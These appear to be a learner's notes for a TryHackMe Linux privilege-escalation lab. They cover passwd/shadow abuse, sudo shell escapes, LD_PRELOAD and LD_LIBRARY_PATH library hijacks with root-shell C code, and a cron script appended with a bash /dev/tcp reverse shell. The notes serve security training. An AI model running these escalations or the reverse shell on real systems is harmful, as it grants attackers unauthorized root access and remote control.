THM: Linux PrivEsc
-------------------
-------------------

### Task2: Service Exploits: 

#### PrivEsc via: ***Mysql***

### Task3: Weak File Permissions - Readable /etc/shadow

### Task4: Weak File Permissions - Writable /etc/shadow

#### To generate sha-512 hashed password:
```
$ mkpasswd -m sha-512 <password>
```
OR,

#### 'openssl passwd' with no options, will produce original crypt(3)-compatible hash
```
$ openssl passwd <password>
```
### Task5:  Weak File Permissions - Writable /etc/passwd
#### Same, generate password:

#### To generate sha-512 hashed password:
```
$ mkpasswd -m sha-512 <password>
```
OR,

#### 'openssl passwd' with no options, will produce original crypt(3)-compatible hash
```
$ openssl passwd <password>
```
Either edit the **root** passwd or append the new password with new user account with **uid=0** at the bottom

### Task6:  Sudo - Shell Escape Sequences
#### We will use: [GTFOBins](https://gtfobins.github.io)
```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop  ------> 1.
    (root) NOPASSWD: /usr/bin/find  -----------------> 2.
    (root) NOPASSWD: /usr/bin/nano ----->  3. 
    (root) NOPASSWD: /usr/bin/vim ----------------> 4.
    (root) NOPASSWD: /usr/bin/man ------------> 5.
    (root) NOPASSWD: /usr/bin/awk --------------------> 6. 
    (root) NOPASSWD: /usr/bin/less ---------------> 7. 
    (root) NOPASSWD: /usr/bin/ftp -----> 8.
    (root) NOPASSWD: /usr/bin/nmap --------------> 9.
    (root) NOPASSWD: /usr/sbin/apache2 ----------------> 10.
    (root) NOPASSWD: /bin/more -------------> 11.

```
6. /usr/bin/awk   
```
$ sudo awk 'BEGIN {system("/bin/sh")}'

sh-4.1# groups
root
```
1. /usr/sbin/iftop
```
$ sudo iftop
!/bin/sh

sh-4.1# groups
root
```
2. /usr/bin/find
```
$ sudo find . -exec /bin/sh \; -quit

sh-4.1# groups
root
```
3. /usr/bin/nano
```
$ sudo nano
^R^X
reset; sh 1>&0 2>&0
```
4. /usr/bin/vim
```
$ sudo vim -c ':!/bin/sh'

sh-4.1# groups
root
```
OR,
```
$ sudo vim 

:!/bin/sh
sh-4.1# groups
root
```
5. /usr/bin/man
```
$ sudo man man

!/bin/sh

sh-4.1# groups
root
```
7. /usr/bin/less
```
$ sudo less /etc/profile

!/bin/sh

sh-4.1# groups
root
```
8. /usr/bin/ftp
```
$ sudo ftp
ftp> !/bin/sh
sh-4.1# groups
root
```
9. /usr/bin/nmap
```
$ sudo nmap --interactive

Starting Nmap V. 5.00 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-4.1# groups
root
```
11. /bin/more
```
$ TERM= sudo more /etc/profile

# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "`id -u`" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
else
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
fi
export PATH

if [ "$PS1" ]; then
  if [ "$BASH" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
!/bin/sh

sh-4.1# groups
root
```
Only with **/usr/sbin/apache2**, we can't escalate our privileges

### Task7:  Sudo - Environment Variables

**LD_PRELOAD** and **LD_LIBRARY_PATH** are both inherited from the user's environment.
* **LD_PRELOAD** loads a **shared object** before any others when a program is run.
* **LD_LIBRARY_PATH** provides a **list of directories where shared libraries are searched for first.**

```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
### Create a shared object:
```
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
In this step: We are directly converting **C file** to **shared obj** file (**without making obj file** in the middle)
```
step1: $ gcc -c -Wall -Werror -fpic foo.c
step2: $ gcc -shared -o libfoo.so foo.o
```
Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object
```
$ sudo LD_PRELOAD=/tmp/preload.so more

root@debian:/home/user# groups
root
```
#### We can use any other programs which are allowed (given in the output of sudo -l)

```
 $ cat tools/sudo/preload.c 

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");   ------->
	setresuid(0,0,0);         ------->
	system("/bin/bash -p");
}

 $ cat tools/sudo/library_path.c 
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");    ----->
	setresuid(0,0,0);               ----->    
	system("/bin/bash -p");
}

```
setsuid sets:

1. ruid : real user ID
2. euid : effective user ID
3. suid : set-user-ID 

#### Same thing for setguid
```
int setresuid(uid_t ruid, uid_t euid, uid_t suid);
int setresgid(gid_t rgid, gid_t egid, gid_t sgid);
```
Run **ldd** against the **apache2** program file to see which **shared libraries** are used by the program:
```
$ ldd /usr/sbin/apache2
```
Create a **shared object** with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Run **apache2** using **sudo**, while settings the **LD_LIBRARY_PATH** environment variable to **/tmp (where we output the compiled shared object)**:
```
$ sudo LD_LIBRARY_PATH=/tmp apache2
```
#### A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

#### Remember to exit out of the root shell before continuing!

### Now lets try renaming /tmp/libcrypt.so.1 to /tmp/libpcre.so.3 used by apache2 and re-run apache2 using sudo again and lets see if gives us the root shell.

```diff
$ ldd /usr/sbin/apache2

	linux-vdso.so.1 =>  (0x00007fffdc5a4000)
+ libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fbae5d1a000)
	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fbae5af6000)
	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fbae58bc000)
	libpthread.so.0 => /lib/libpthread.so.0 (0x00007fbae56a0000)
	libc.so.6 => /lib/libc.so.6 (0x00007fbae5334000)
	libuuid.so.1 => /lib/libuuid.so.1 (0x00007fbae512f000)
	librt.so.1 => /lib/librt.so.1 (0x00007fbae4f27000)
+ libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fbae4cf0000)
	libdl.so.2 => /lib/libdl.so.2 (0x00007fbae4aeb000)
	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fbae48c3000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fbae61d7000)

+$ echo "void pcre_free(){}" >> tools/sudo/library_path.c   
$ cat tools/sudo/library_path.c 
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
+void pcre_free(){}

+$ gcc -o /tmp/libpcre.so.3 -shared -fPIC tools/sudo/library_path.c 
 $ sudo LD_LIBRARY_PATH=/tmp apache2

 root@debian:/home/user# groups
 root

```
It doesn't work, so we edited the /home/user/tools/sudo/library_path.c as shown above, so that we satisfy the compiler and it then works!

### Task8: Cron Jobs - File Permissions

#### View the contents of the system-wide crontab:

```diff
$ cat /etc/crontab

  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.

  SHELL=/bin/sh
  PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

  # m h dom mon dow user	command
  17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
  25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
+ * * * * * root overwrite.sh                      ---------> 1st cronjob
+ * * * * * root /usr/local/bin/compress.sh        -----> 2nd cronjob
```
We can manipulate the contents wihtin it to  privesc, but before that we have to know that what is the status(permission) of those 2 files.
```
$ locate overwrite.sh
/usr/local/bin/overwrite.sh
```
We got that overwrite.sh has **rw** perm for **others**
```
$ cat /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless

$ cat "bash -i >& /dev/tcp/{ip}/4444 0>&1" >> /usr/local/bin/overwrite.sh
```
#### Then set up a listener:
```
$ nc -nlvp 4444
```
#### Then we will ge the shell
